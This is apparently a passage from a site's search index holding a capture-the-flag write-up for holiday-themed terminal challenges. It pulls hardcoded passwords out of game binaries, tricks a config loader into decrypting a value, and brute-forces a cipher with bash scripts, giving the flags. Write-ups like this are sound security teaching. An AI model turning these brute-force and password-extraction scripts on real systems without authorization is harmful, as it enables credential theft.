IDA and Ghidra (unless you WANT to use them!) elf@bfa5a25732b3 ~ $","title":"Shell"},{"location":"challenges/terminal-challenges/speaker-unprep/#solution","text":"Let's see what's available to us: elf@bfa5a25732b3 ~ $ ls -alt total 852 drwxr-xr-x 1 root root 4096 Dec 3 20:43 . drwxr-xr-x 1 elf elf 4096 Dec 3 20:43 .local drwxr-xr-x 1 elf elf 4096 Dec 3 20:43 lab drwxr-xr-x 1 root root 4096 Dec 3 20:41 .. -rwxr-xr-x 1 root root 231728 Dec 1 19:19 door -rwxr-xr-x 1 root root 276784 Dec 1 19:19 lights -rwxr-xr-x 1 root root 321840 Dec 1 19:19 vending-machines -rw-r--r-- 1 root root 102 Oct 1 17:37 .bashrc -rw-r--r-- 1 root root 92 Oct 1 17:37 lights.conf -rw-r--r-- 1 root root 59 Oct 1 17:37 vending-machines.json -rw-r--r-- 1 elf elf 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 elf elf 807 Apr 18 2019 .profile elf@bfa5a25732b3 ~ $","title":"Solution"},{"location":"challenges/terminal-challenges/speaker-unprep/#door","text":"elf@bfa5a25732b3 ~ $ file door door: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpre ter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4973fb994a1038936fd611 1fa1e01d95f052a1dd, stripped elf@bfa5a25732b3 ~ $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter? > Since the password is stored in the binary, we can just search the strings in the binary elf@bfa5a25732b3 ~ $ strings door | grep -i pass /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" Beep boop invalid password elf@bfa5a25732b3 ~ $ flag : Op3nTheD00r","title":"Door"},{"location":"challenges/terminal-challenges/speaker-unprep/#lights","text":"elf@bdd3e4aedbaf ~ $ file lights lights: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interp reter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5bd84970c7dc4ca56105 234dda82c961a3677143, stripped elf@bdd3e4aedbaf ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > We can check the lights.conf file for a password elf@bdd3e4aedbaf ~ $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician Then try to pass in the given password value to the interactive prompt elf@bdd3e4aedbaf ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 Checking...... Beep boop invalid password elf@bdd3e4aedbaf ~ $ Looks like the password is encrypted, but the username is decrypted due to the message, \"CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED.\" So let's switch the username and password keys in the lights.conf file to see if the program can decrypt the password value for us. elf@4f561142e32b ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician elf@4f561142e32b ~/lab $ vim lights.conf elf@4f561142e32b ~/lab $ cat lights.conf name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 password: elf-technician elf@4f561142e32b ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, Computer-TurnLightsOn What do you enter? > Computer-TurnLightsOn Checking...... Beep boop invalid password elf@4f561142e32b ~/lab $ vim lights.conf elf@4f561142e32b ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician elf@4f561142e32b ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > Computer-TurnLightsOn Checking...... That would have turned on the lights! If you've figured out the real password, be sure you run /home/elf/lights elf@4f561142e32b ~/lab $ Let's try it on prod elf@4f561142e32b ~ $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin--- >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter? > Computer-TurnLightsOn Checking...... Lights on! elf@4f561142e32b ~ $ flag: Computer-TurnLightsOn","title":"Lights"},{"location":"challenges/terminal-challenges/speaker-unprep/#vending-machines","text":"elf@35af65fe84ed ~/lab $ file vending-machines vending-machines: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically link ed, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=23634d9cce f73f0676a5247d302084267fa92f79, stripped elf@35af65fe84ed ~/lab $ ./vending-machines The elves are hungry! If the door's still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on... Loading configuration from: /home/elf/lab/vending-machines.json I wonder what would happen if it couldn't find its config file? Maybe that's something you could figure out in the lab... Welcome, elf-maintenance! It looks like you want to turn the vending machines back on? Please enter the vending-machine-back-on code > test Checking...... Beep boop invalid password elf@35af65fe84ed ~/lab $ Let's start removing the config file, as recommended elf@35af65fe84ed ~/lab $ cat vending-machines.json { \"name\": \"elf-maintenance\", \"password\": \"LVEdQPpBwr\" }elf@35af65fe84ed ~/lab $ rm vending-machines.json elf@35af65fe84ed ~/lab $ ./vending-machines The elves are hungry! If the door's still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on... Loading configuration from: /home/elf/lab/vending-machines.json I wonder what would happen if it couldn't find its config file? Maybe that's something you could figure out in the lab... ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated! Please enter the name > test Please enter the password > foobar Welcome, test! It looks like you want to turn the vending machines back on? Please enter the vending-machine-back-on code > temp-code Checking...... Beep boop invalid password elf@35af65fe84ed ~/lab $ ls -lt total 824 -rw-r--r-- 1 elf elf 44 Jan 4 02:54 vending-machines.json -rwxr-xr-x 1 elf elf 231728 Dec 3 20:43 door -rwxr-xr-x 1 elf elf 276784 Dec 3 20:43 lights -rw-r--r-- 1 elf elf 92 Dec 3 20:43 lights.conf -rwxr-xr-x 1 elf elf 321840 Dec 3 20:43 vending-machines elf@35af65fe84ed ~/lab $ cat vending-machines.json { \"name\": \"test\", \"password\": \"8jfBam\" }elf@35af65fe84ed ~/lab $ It looks as though removing the .json makes the vending-machine executable create a new file with the given name and password. Since we're not able to make any modifications to the prod .json, we can use this new-file-creation feature to find determine what encryption algorithm encrypts the password. Let encryption function E_k: P -> C where P = plaintext space, C = ciphertext space, k = key ================================= p \\in P | c \\in C --------------------------------- A | X AA | Xi AB | Xq A1 | Xr AAA | XiG AAAA | XiGR AAAAA | XiGRe AAAAAA | XiGReh BAAAAA | DiGReh AAAAAAA | XiGRehm AAAAAAAAAAAAAAA | XiGRehmwXiGRehm Since each additional plaintext character yields a corresponding additional ciphertext character, we know that the cipher operates on 1-byte blocks, suggesting a stream cipher like RC4 or Salsa20. Additionally, since changing the first plaintext character only changes the first ciphertext byte, we can determine that the algorithm is using electronic codebook (ECB) mode encryption. Therefore, the plaintext of LVEdQPpBwr is 10 characters long and is easily bruteforceable as we can test each character sequentially. Before bruteforcing, let's see if we can generate a wordlist of 10-character long strings associated with elf-maintenance . # Elf names Shortstack shortstack Bonbowford bonbowford Sappington sappington Ninecandle ninecandle # Associated terms Kringlecon kringlecon and perform a dictionary attack with the following quick script elf@da7e515c9976 ~/lab $ touch dict-attack.sh elf@da7e515c9976 ~/lab $ vim dict-attack.sh elf@da7e515c9976 ~/lab $ chmod u+x dict-attack.sh elf@da7e515c9976 ~/lab $ cat dict-attack.sh #!/bin/bash WORDS=$(cat wordlist.txt) for WORD in $WORDS do echo \"performing attack with payload: $WORD\" touch input.txt echo \"username\" > input.txt echo $WORD >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null if [ ! -f ./outputs.txt ]; then touch outputs.txt fi echo \"$WORD:$(cat vending-machines.json)\" >> outputs.txt done elf@da7e515c9976 ~/lab $ elf@da7e515c9976 ~/lab $ ./dict-attack.sh performing attack with payload: Shortstack performing attack with payload: shortstack performing attack with payload: Bonbowford performing attack with payload: bonbowford performing attack with payload: Sappington performing attack with payload: sappington performing attack with payload: Ninecandle performing attack with payload: ninecandle performing attack with payload: Kringlecon performing attack with payload: kringlecon elf@da7e515c9976 ~/lab $ cat outputs.txt Shortstack:{ \"name\": \"username\", \"password\": \"4nfydSTge6\" } shortstack:{ \"name\": \"username\", \"password\": \"AnfydSTge6\" } Bonbowford:{ \"name\": \"username\", \"password\": \"DjEBhK5c5R\" } bonbowford:{ \"name\": \"username\", \"password\": \"GjEBhK5c5R\" } Sappington:{ \"name\": \"username\", \"password\": \"4VM54XfNRh\" } sappington:{ \"name\": \"username\", \"password\": \"AVM54XfNRh\" } Ninecandle:{ \"name\": \"username\", \"password\": \"Z0EQ6cDbfc\" } ninecandle:{ \"name\": \"username\", \"password\": \"b0EQ6cDbfc\" } Kringlecon:{ \"name\": \"username\", \"password\": \"FNs6PsuRRh\" } kringlecon:{ \"name\": \"username\", \"password\": \"oNs6PsuRRh\" } elf@da7e515c9976 ~/lab $ So the first dictionary attack didn't give us anything except the following characters in the plaintext password: _ a n _ _ _ _ _ _ _ . Since the first character is neither S nor s , the first few characters are not Santa , but can be C / candycanes . Will just quickly check that out to see if it works. Candycanes:{ \"name\": \"username\", \"password\": \"LVEdQEpBw5\" } candycanes:{ \"name\": \"username\", \"password\": \"eVEdQEpBw5\" } The Candycanes payload is pretty close to the ciphertext we're trying to crack: LVEdQPpBwr . Therefore, we know that the plaintext is: C a n d y _ a n e _ . We can then bruteforce the missing blanks to see what the plaintext is. We start with bruteforcing the first character we don't know with the following script, where charlist.txt is a wordlist containing alphabet chars: elf@5b32c1cf8624 ~/lab $ vim bruteforce.sh elf@5b32c1cf8624 ~/lab $ cat bruteforce.sh #!/bin/bash CHARS=$(cat charlist.txt) for CHAR in $CHARS do echo \"performing attack with payload: $CHAR\" touch input.txt echo \"username\" > input.txt echo \"Candy${CHAR}ane\" >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null OUTPUT=$(cat vending-machines.json | python -c \\ 'import json,sys;obj=json.load(sys.stdin);print obj[\"password\"]') if [[ \"$OUTPUT\" == \"LVEdQPpBw\" ]]; then echo \"Found: Candy${CHAR}ane -- $OUTPUT\" break fi done elf@5b32c1cf8624 ~/lab $ elf@5b32c1cf8624 ~/lab $ ./bruteforce.sh performing attack with payload: t performing attack with payload: y performing attack with payload: u performing attack with payload: i performing attack with payload: o performing attack with payload: p performing attack with payload: a performing attack with payload: s performing attack with payload: d performing attack with payload: f performing attack with payload: g performing attack with payload: h performing attack with payload: j performing attack with payload: k performing attack with payload: l performing attack with payload: z performing attack with payload: x performing attack with payload: c performing attack with payload: v performing attack with payload: b performing attack with payload: n performing attack with payload: m performing attack with payload: Q performing attack with payload: W performing attack with payload: E performing attack with payload: R performing attack with payload: T performing attack with payload: Y performing attack with payload: U performing attack with payload: I performing attack with payload: O performing attack with payload: P performing attack with payload: A performing attack with payload: S performing attack with payload: D performing attack with payload: F performing attack with payload: G performing attack with payload: H performing attack with payload: J performing attack with payload: K performing attack with payload: L performing attack with payload: Z performing attack with payload: X performing attack with payload: C Found: CandyCane -- LVEdQPpBw elf@5b32c1cf8624 ~/lab $ And we modify the bruteforce.sh script with the found C to find the final unknown character elf@5b32c1cf8624 ~/lab $ vim bruteforce.sh elf@5b32c1cf8624 ~/lab $ cat bruteforce.sh #!/bin/bash CHARS=$(cat charlist.txt) for CHAR in $CHARS do echo \"performing attack with payload: $CHAR\" touch input.txt echo \"username\" > input.txt echo \"CandyCane${CHAR}\" >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null OUTPUT=$(cat vending-machines.json | python -c \\ 'import json,sys;obj=json.load(sys.stdin);print obj[\"password\"]') if [[ \"$OUTPUT\" == \"LVEdQPpBwr\" ]]; then echo \"Found: CandyCane${CHAR} -- $OUTPUT\" break fi done elf@5b32c1cf8624 ~/lab $ Nothing was found, so let's bruteforce the final character with numbers and symbols ( numsymlist.txt is a wordlist of numbers and symbols): ```bashelf@5b32c1cf8624 ~/lab $ vim bruteforce.sh elf@5b32c1cf8624 ~/lab $ cat bruteforce.sh","title":"Vending Machines"},{"location":"challenges/terminal-challenges/speaker-unprep/#binbash","text":"CHARS=$(cat numsymlist.txt) for CHAR in $CHARS do echo \"performing attack with payload: $CHAR\" touch input.txt echo \"username\" > input.txt echo \"CandyCane${CHAR}\" >> input.txt echo \"temp-code\" >> input.txt rm vending-machines.json cat input.txt | ./vending-machines > /dev/null OUTPUT=$(cat vending-machines.json | python -c \\ 'import json,sys;obj=json.load(sys.stdin);print obj[\"password\"]') if [[ \"$OUTPUT\" == \"LVEdQPpBwr\" ]]; then echo \"Found: CandyCane${CHAR} -- $OUTPUT\" break fi done elf@5b32c1cf8624 ~/lab $ ```bash elf@5b32c1cf8624 ~/lab $ ./bruteforce.sh performing attack with payload: 1 Found: CandyCane1 -- LVEdQPpBwr elf@5b32c1cf8624 ~/lab $ Et voil\u00e0! Let's try out CandyCane1 elf@5b32c1cf8624 ~ $ ./vending-machines The elves are hungry! If the door's still closed or the lights are still off, you know because you can hear them complaining about the turned-off vending machines! You can probably make some friends if you can get them back on... Loading configuration from: /home/elf/vending-machines.json I wonder what would happen if it couldn't find its config file? Maybe that's something you could figure out in the lab... Welcome, elf-maintenance! It looks like you want to turn the vending machines back on? Please enter the vending-machine-back-on code > CandyCane1 Checking...... Vending machines enabled!! elf@5b32c1cf8624 ~ $ flag: CandyCane1","title":"!/bin/bash"},{"location":"challenges/terminal-challenges/unescape-tmux/","text":"Unescape Tmux Shell Can you help me? I was playing with my birdie (she's a Green Cheek!) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! elf@27d066064877:~$ Solution Just use tmux commands to view and attach any existing sessions elf@27d066064877:~$ ls -alt total 24 drwxr-xr-x 1 elf elf 4096 Dec 4 18:21 . drwxr-xr-x 1 root root 4096 Dec 1 18:28 .. -rwxr-xr-x 1 root root 182 Oct 1 17:37 .bashrc -rw-r--r-- 1 root root 77 Oct 1 17:37 .tmux.conf -rw-r--r-- 1 elf elf 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 elf elf 807 Apr 18 2019 .profile elf@27d066064877:~$ tmux ls 0: 1 windows (created Tue Dec 29 20:44:36 2020) [80x24] elf@27d066064877:~$ tmux a","title":"Terminal/Unescape Tmux"},{"location":"challenges/terminal-challenges/unescape-tmux/#unescape-tmux","text":"","title":"Unescape Tmux"},{"location":"challenges/terminal-challenges/unescape-tmux/#shell","text":"Can you help me? I was playing with my birdie (she's a Green Cheek!) in something called tmux, then I did something and it disappeared! Can you help me find her? We were so attached!! elf@27d066064877:~$","title":"Shell"},{"location":"challenges/terminal-challenges/unescape-tmux/#solution","text":"Just use tmux commands to view and attach any existing sessions elf@27d066064877:~$ ls -alt total 24 drwxr-xr-x 1 elf elf 4096 Dec 4 18:21 . drwxr-xr-x 1 root root 4096 Dec 1 18:28 .. -rwxr-xr-x 1 root root 182 Oct 1 17:37 .bashrc -rw-r--r-- 1 root root 77 Oct 1 17:37 .tmux.conf -rw-r--r-- 1 elf elf 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 elf elf 807 Apr 18 2019 .profile elf@27d066064877:~$ tmux ls 0: 1 windows (created Tue Dec 29 20:44:36 2020) [80x24] elf@27d066064877:~$ tmux a","title":"Solution"}]}